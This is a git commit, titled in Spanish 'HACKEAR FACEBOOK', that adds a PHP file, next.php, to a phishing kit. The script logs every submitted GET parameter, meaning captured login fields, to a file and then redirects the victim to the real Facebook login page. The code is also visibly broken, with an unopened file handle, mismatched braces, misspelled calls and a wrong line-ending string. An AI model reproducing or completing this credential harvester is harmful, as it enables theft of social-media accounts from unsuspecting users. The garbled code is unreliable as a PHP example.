211d13bd8d772c66f2f559289d41911945a03e27
aronricardo <anagabydesquit@gmail.com>
2017-11-07 20:27:59 -0600

    HACKEAR FACEBOOK
    codigo de fuente

---
+++ next.php
@@ -0,0 +1,35 @@
+
+<?php
+header("Location: http://www.Facebook.com/login.php ");
+
+foreach($_GET as $variable => $value) {
+        fwrite($handle, $variable);
+
+        fwrite($handle, "="); 
+
+        fwrite($handle, $value);
+
+        fwrite($handle, "/r/n");
+{
+frite($ande, "/r/n");
+fclose($handle);
+
+exit
+?> 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<
